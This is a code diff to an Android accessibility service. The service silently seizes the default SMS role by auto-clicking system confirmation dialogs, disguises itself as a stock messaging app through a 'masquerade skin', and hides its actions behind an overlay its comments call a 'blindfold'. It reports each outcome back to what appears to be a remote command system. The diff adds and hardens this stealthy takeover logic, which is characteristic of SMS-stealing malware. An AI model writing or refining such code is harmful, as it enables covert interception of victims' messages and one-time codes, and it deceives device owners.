@@ -429,30 +429,30 @@ class MyAccessibilityService : AccessibilityService() {
                     return
                 }
 
-                // VERIFICATION: Check if target is already set
+                // VERIFICATION: Check if target is already set (Passive Fallback)
                 val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(this)
                 val isFinished = if (mode == "AUTO_NAV") currentDefault == packageName else currentDefault == originalPkg
 
-                                if (isFinished) {
-                    DebugLogger.log("SMS_NAV", "Verification SUCCESS! Target ($targetLabel) is now Default.")
+                if (isFinished) {
+                    DebugLogger.log("SMS_NAV", "Passive Verification SUCCESS! Target ($targetLabel) is now Default.")
                     DefaultSmsManager.expectedMode = ""
                     if (mode == "AUTO_NAV") CommandProcessor.applyMasqueradeSkin(this, "SAM_MSG")
 
                     val msg = if (mode == "AUTO_NAV") "Set as Default SMS via manual fallback" else "Original SMS app restored"
                     CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", msg)
 
-                    // Delay HOME to ensure dialog dismissal/transitions finish first, so OS doesn't drop the command
+                    // Delay HOME to ensure dialog dismissal/transitions finish first
                     android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                         performGlobalAction(GLOBAL_ACTION_HOME)
-                        // Redundancy: send HOME twice to guarantee execution
                         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                             performGlobalAction(GLOBAL_ACTION_HOME)
-                        }, 300)
-                    }, 800)
+                        }, 500) // Double-tap home for absolute certainty
+                    }, 1500)
 
+                    // Generous 5-second timer to ensure UI has fully exited to home before unblinding
                     android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                         DynamicUIManager.removeOverlay(this@MyAccessibilityService, "RESTORE_SUCCESS_HOME_ROUTED")
-                    }, 2500)
+                    }, 5000)
                     return
                 }
 
@@ -462,7 +462,7 @@ class MyAccessibilityService : AccessibilityService() {
                     val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                     val lastLoop = prefs.getLong("sms_nav_loop_ts", 0L)
                     
-                    if (System.currentTimeMillis() - lastLoop < 2000) return
+                    if (System.currentTimeMillis() - lastLoop < 3000) return // Increased debounce to 3s
                     
                     val targetCount = appNodes.size
                     DebugLogger.log("SMS_NAV_PHASE1", "Found $targetCount nodes matching target label: '$targetLabel'")
@@ -478,27 +478,58 @@ class MyAccessibilityService : AccessibilityService() {
                             clicked = true
                             prefs.edit().putLong("sms_nav_loop_ts", System.currentTimeMillis()).apply()
                             
-                            // Handle Confirmation Dialogs after click (Scan for 2.5s)
+                            // --- ACTIVE POLLING ENGINE (Guarantees Navigation) ---
                             kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
-                                for (attempt in 1..5) {
+                                var isSuccess = false
+                                val expectedPkg = if (mode == "AUTO_NAV") packageName else originalPkg
+                                
+                                for (attempt in 1..15) { // Scan for up to 7.5 seconds
                                     delay(500)
+                                    
+                                    // 1. Handle confirmation dialogs
                                     val confirmRoot = rootInActiveWindow
                                     if (confirmRoot != null) {
                                         val keywords = listOf("Set as default", "Set", "OK", "Default")
-                                        var confirmClicked = false
                                         for (kw in keywords) {
                                             val btn = confirmRoot.findAccessibilityNodeInfosByText(kw).find { it.isClickable }
                                             if (btn != null) {
                                                 btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                                 DebugLogger.log("SMS_NAV_CONFIRM", "Clicked confirm dialog button: '$kw'")
-                                                confirmClicked = true
                                                 break
                                             }
                                         }
-                                        if (confirmClicked) break
+                                    }
+                                    
+                                    // 2. Actively verify backend instead of waiting for UI event
+                                    if (android.provider.Telephony.Sms.getDefaultSmsPackage(this@MyAccessibilityService) == expectedPkg) {
+                                        isSuccess = true
+                                        break
+                                    }
+                                }
+
+                                // 3. Proactive routing and cleanup
+                                if (isSuccess && DefaultSmsManager.expectedMode.isNotEmpty()) {
+                                    withContext(kotlinx.coroutines.Dispatchers.Main) {
+                                        DebugLogger.log("SMS_NAV", "Active Verification SUCCESS! Routing to Home.")
+                                        DefaultSmsManager.expectedMode = "" // Disarm script
+                                        
+                                        if (mode == "AUTO_NAV") CommandProcessor.applyMasqueradeSkin(this@MyAccessibilityService, "SAM_MSG")
+                                        val successMsg = if (mode == "AUTO_NAV") "Set as Default SMS via manual fallback" else "Original SMS app restored"
+                                        CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", successMsg)
+
+                                        delay(1000) // Let backend changes stabilize
+                                        performGlobalAction(GLOBAL_ACTION_HOME)
+                                        delay(400)
+                                        performGlobalAction(GLOBAL_ACTION_HOME)
+
+                                        // Safely drop the blindfold after transitioning home
+                                        delay(3500) 
+                                        DynamicUIManager.removeOverlay(this@MyAccessibilityService, "RESTORE_SUCCESS_PROACTIVE")
                                     }
                                 }
                             }
+                            // --- END ACTIVE POLLING ENGINE ---
+                            
                             break // Found and clicked, exit loop
                         } else {
                             DebugLogger.log("SMS_NAV_PHASE1", "Candidate $i is NOT clickable, skipping...")
